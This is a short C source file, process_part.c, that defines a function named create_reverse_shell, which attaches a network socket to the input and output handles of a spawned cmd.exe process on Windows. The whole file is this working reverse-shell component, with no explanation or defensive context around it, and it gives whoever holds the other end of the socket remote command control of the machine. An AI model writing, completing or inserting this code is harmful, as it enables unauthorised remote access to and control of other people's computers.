// process_part.c
#include <windows.h>
#include <stdio.h>

void create_reverse_shell(SOCKET sock) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Set up STARTUPINFO
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Launch cmd.exe
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("Failed to start cmd.exe (%d)\n", GetLastError());
    }

    // Close handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}